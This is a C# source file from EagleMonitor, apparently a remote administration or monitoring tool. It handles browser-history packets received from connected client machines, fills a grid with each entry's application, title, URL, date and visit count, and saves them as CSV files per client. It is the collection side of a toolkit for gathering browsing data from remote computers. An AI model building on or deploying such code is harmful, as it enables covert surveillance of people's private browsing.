using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class HistoryPacketHandler
    {
        public HistoryPacketHandler(HistoryPacket historyPacket, ClientHandler clientHandler) : base() 
        {
            new Thread(() =>
            {
                if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\History\\"))
                    System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\History");
                if (historyPacket.historyList != null)
                {
                    try
                    {
                        if (clientHandler.historyForm.dataGridView1 != null)
                        {
                            clientHandler.historyForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.historyForm.dataGridView1.Rows.Clear();
                                foreach (object[] str in historyPacket.historyList)
                                {
                                    int rowId = clientHandler.historyForm.dataGridView1.Rows.Add();
                                    DataGridViewRow row = clientHandler.historyForm.dataGridView1.Rows[rowId];
                                    row.Cells["Column1"].Value = str[0].ToString();
                                    row.Cells["Column2"].Value = str[1].ToString();
                                    row.Cells["Column3"].Value = str[2].ToString();
                                    row.Cells["Column4"].Value = str[3].ToString();
                                    row.Cells["Column5"].Value = str[4].ToString();
                                }
                                Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                                clientHandler.historyForm.loadingCircle1.Visible = false;
                                clientHandler.historyForm.loadingCircle1.Active = false;
                            }));
                        }
                        else
                        { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                    }
                    catch
                    { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                }
                else
                    return;
            }).Start();
        }
    }
}
